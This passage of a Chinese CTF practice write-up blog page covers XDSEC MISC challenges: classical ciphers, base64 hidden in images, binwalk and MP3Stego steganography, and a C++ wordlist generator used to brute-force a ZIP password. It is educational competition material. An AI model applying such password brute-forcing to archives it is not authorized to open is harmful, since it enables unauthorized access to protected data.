+<h1 id="2丶神秘代码2-30"><a href="#2丶神秘代码2-30" class="headerlink" title="2丶神秘代码2(30)"></a>2丶神秘代码2(30)</h1><p>凯撒密码是种移位加密的，直接在线进行变换位置解密，在线解密地址<a href="https://www.cryptool.org/en/cto-ciphers/caesar，解密得到flag。。" target="_blank" rel="noopener">https://www.cryptool.org/en/cto-ciphers/caesar，解密得到flag。。</a></p>
+<p><img src="http://img.blog.csdn.net/20170905175625167?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="3丶栅栏-30"><a href="#3丶栅栏-30" class="headerlink" title="3丶栅栏(30)"></a>3丶栅栏(30)</h1><p>栅栏密码加密，直接在线<a href="http://www.qqxiuzi.cn/bianma/zhalanmima.php每组字符设为4得到flag" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/zhalanmima.php每组字符设为4得到flag</a><br><img src="http://img.blog.csdn.net/20170904235534742?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="4丶杜神给你说flag-70"><a href="#4丶杜神给你说flag-70" class="headerlink" title="4丶杜神给你说flag!(70)"></a>4丶杜神给你说flag!(70)</h1><p>将2.jpg拖进WinHex，发现一串尾部有一串奇怪的字符，=号结尾，怀疑可能是base64编码的。。<br><img src="http://img.blog.csdn.net/20170905000048360?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>解码得到flag。。<br><img src="http://img.blog.csdn.net/20170905000151406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="5丶压缩包-70"><a href="#5丶压缩包-70" class="headerlink" title="5丶压缩包(70)"></a>5丶压缩包(70)</h1><p>根据提示提示，这题应该要暴力破解，密码是XDSEC后面跟上未知9位数字，首先写段C++代码生成符合密码形式的字典。。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">ofstream <span class="title">f1</span><span class="params">(<span class="string">"output.txt"</span>)</span></span>;</span><br><span class="line">	<span class="keyword">int</span> p[<span class="number">9</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a&lt;<span class="number">9</span>; a++)</span><br><span class="line">	&#123;</span><br><span class="line">		p[<span class="number">0</span>] = a;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> b = <span class="number">0</span>; b&lt;<span class="number">10</span>; b++)</span><br><span class="line">		&#123;</span><br><span class="line">			p[<span class="number">1</span>] = b;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> c = <span class="number">0</span>; c&lt;<span class="number">10</span>; c++)</span><br><span class="line">			&#123;</span><br><span class="line">				p[<span class="number">2</span>] = c;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> d = <span class="number">0</span>; d&lt;<span class="number">10</span>; d++)</span><br><span class="line">				&#123;</span><br><span class="line">					p[<span class="number">3</span>] = d;</span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">int</span> e = <span class="number">0</span>; e&lt;<span class="number">10</span>; e++)</span><br><span class="line">					&#123;</span><br><span class="line">						p[<span class="number">4</span>] = e;</span><br><span class="line">						<span class="keyword">for</span> (<span class="keyword">int</span> f = <span class="number">0</span>; f&lt;<span class="number">10</span>; f++)</span><br><span class="line">						&#123;</span><br><span class="line">							p[<span class="number">5</span>] = f;</span><br><span class="line">							<span class="keyword">for</span> (<span class="keyword">int</span> g = <span class="number">0</span>; g&lt;<span class="number">10</span>; g++)</span><br><span class="line">							&#123;</span><br><span class="line">								p[<span class="number">6</span>] = g;</span><br><span class="line">								<span class="keyword">for</span> (<span class="keyword">int</span> h = <span class="number">0</span>; h&lt;<span class="number">10</span>; h++)</span><br><span class="line">								&#123;</span><br><span class="line">									p[<span class="number">7</span>] = h;</span><br><span class="line">									<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">									&#123;</span><br><span class="line">										p[<span class="number">8</span>] = i;</span><br><span class="line">										<span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k&lt;<span class="number">9</span>; k++)</span><br><span class="line">										&#123;</span><br><span class="line">											f1 &lt;&lt; p[k];</span><br><span class="line">										&#125;</span><br><span class="line">										f1 &lt;&lt; <span class="string">"\nxdsec"</span>;</span><br><span class="line">									&#125;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	f1.close();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"生成字典完成"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>生成的字典接近13G，费的时间有点长。。<br><img src="http://img.blog.csdn.net/20170905001750511?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>用AAPR爆破得到解压密码，解压flag.txt得到flag</p>
+<p><img src="http://img.blog.csdn.net/20170905221001424?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h1 id="6丶藏了什么？-100"><a href="#6丶藏了什么？-100" class="headerlink" title="6丶藏了什么？(100)"></a>6丶藏了什么？(100)</h1><p>很简单的隐写，用binwalk工具分析发现图片里面有个压缩包，压缩包里有个flag.txt。。<br><img src="http://img.blog.csdn.net/20170905003101271?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>直接用-e参数分离出压缩包并解压出了flag.txt。。<br><img src="http://img.blog.csdn.net/20170905003344694?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>txt文档里面的内容是base64编码了的，解码得到flag。。</p>
+<h1 id="7丶这是啥-100"><a href="#7丶这是啥-100" class="headerlink" title="7丶这是啥?(100)"></a>7丶这是啥?(100)</h1><p>提供的是个.pcapng文件，要用Wireshark来分析，过段时间学一下相关知识在来更新-^-)</p>
+<h1 id="8丶滑稽-150"><a href="#8丶滑稽-150" class="headerlink" title="8丶滑稽(150)"></a>8丶滑稽(150)</h1><p>跟misc的第六题一样，先用binwalk分离得到个后缀为mp3的文件。。<br><img src="http://img.blog.csdn.net/20170905004215419?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>播放没发现什么问题，拖进WinHex发现头部是PK，猜想可能是个压缩包。。。<br><img src="http://img.blog.csdn.net/20170905004710032?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>改后缀名为zip，果然是个压缩包。。<br><img src="http://img.blog.csdn.net/20170905004749041?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>根据压缩包里的内容，感觉应该是经过MP3Stego处理的sound.mp3，而paxx.txt里的内容就是解密密码。。<br>用MP3Stego得到个txt文件，文件内容为”X{hd}DHh_SJ_kEHaiC_so”,是栅栏密码加密的，直接在线<a href="http://www.qqxiuzi.cn/bianma/zhalanmima.php每组字符设为5得到flag。。" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/zhalanmima.php每组字符设为5得到flag。。</a><br><img src="http://img.blog.csdn.net/20170905010106131?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMzk5MDA1MA==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/11/26/XDSEC 西电CTF练习题WriteUp/">XDSEC 西电CTF练习题WriteUp</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Banyan 的个人博客">Banyan</a></p>
+        <p><span>发布时间:</span>2017年11月26日 - 21时44分</p>
+        <p><span>最后更新:</span>2017年11月26日 - 22时18分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/11/26/XDSEC 西电CTF练习题WriteUp/" title="XDSEC 西电CTF练习题WriteUp">http://yoursite.com/2017/11/26/XDSEC 西电CTF练习题WriteUp/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/11/26/XDSEC 西电CTF练习题WriteUp/　　作者: Banyan" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2017/11/26/test1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">内网渗透</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1丶PPC"><span class="toc-number">1.</span> <span class="toc-text">1.1丶PPC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1丶算术天才琪露洛-200"><span class="toc-number"></span> <span class="toc-text">1丶算术天才琪露洛(200)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2丶猜数游戏-500"><span class="toc-number"></span> <span class="toc-text">2丶猜数游戏(500)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2丶PWN"><span class="toc-number">1.</span> <span class="toc-text">2丶PWN</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-PWNO-100"><span class="toc-number"></span> <span class="toc-text">1.PWNO(100)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Easy-bof-300"><span class="toc-number"></span> <span class="toc-text">2.Easy bof(300)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3丶FSB-500"><span class="toc-number"></span> <span class="toc-text">3丶FSB(500)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3丶WEB"><span class="toc-number">1.</span> <span class="toc-text">3丶WEB</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1丶where-is-flag-10"><span class="toc-number"></span> <span class="toc-text">1丶where is flag?(10)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2丶饼干-30"><span class="toc-number"></span> <span class="toc-text">2丶饼干(30)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3丶机器人-30"><span class="toc-number"></span> <span class="toc-text">3丶机器人(30)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4丶GET-50"><span class="toc-number"></span> <span class="toc-text">4丶GET(50)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5丶POST-80"><span class="toc-number"></span> <span class="toc-text">5丶POST(80)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6丶PHP是世界最好的语言-100"><span class="toc-number"></span> <span class="toc-text">6丶PHP是世界最好的语言(100)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7丶SQL注入1-150"><span class="toc-number"></span> <span class="toc-text">7丶SQL注入1(150)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8丶XSS测试-150"><span class="toc-number"></span> <span class="toc-text">8丶XSS测试(150)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9丶SQL注入2-300"><span class="toc-number"></span> <span class="toc-text">9丶SQL注入2(300)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4RE"><span class="toc-number">1.</span> <span class="toc-text">4RE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1丶RE1-100"><span class="toc-number"></span> <span class="toc-text">1丶RE1(100)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2丶RE2-200"><span class="toc-number"></span> <span class="toc-text">2丶RE2(200)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3丶你是拥有霸王色运气的萌新吗？-300"><span class="toc-number"></span> <span class="toc-text">3丶你是拥有霸王色运气的萌新吗？(300)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5丶MISC"><span class="toc-number">1.</span> <span class="toc-text">5丶MISC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1丶神秘代码-30"><span class="toc-number"></span> <span class="toc-text">1丶神秘代码(30)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2丶神秘代码2-30"><span class="toc-number"></span> <span class="toc-text">2丶神秘代码2(30)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3丶栅栏-30"><span class="toc-number"></span> <span class="toc-text">3丶栅栏(30)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4丶杜神给你说flag-70"><span class="toc-number"></span> <span class="toc-text">4丶杜神给你说flag!(70)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5丶压缩包-70"><span class="toc-number"></span> <span class="toc-text">5丶压缩包(70)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6丶藏了什么？-100"><span class="toc-number"></span> <span class="toc-text">6丶藏了什么？(100)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7丶这是啥-100"><span class="toc-number"></span> <span class="toc-text">7丶这是啥?(100)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8丶滑稽-150"><span class="toc-number"></span> <span class="toc-text">8丶滑稽(150)</span></a>
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'luuman',
+      repo: 'luuman.github.io',
+      oauth: {
+        client_id: '',
+        client_secret: '',
+      },
+    })
+    gitment.render('gitments')
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2017/11/26/test1/" title="下一篇: 内网渗透">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/11/26/XDSEC 西电CTF练习题WriteUp/">XDSEC 西电CTF练习题WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/26/test1/">内网渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/26/test/">记一次字符格式化漏洞</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Banyan
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >大佬到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
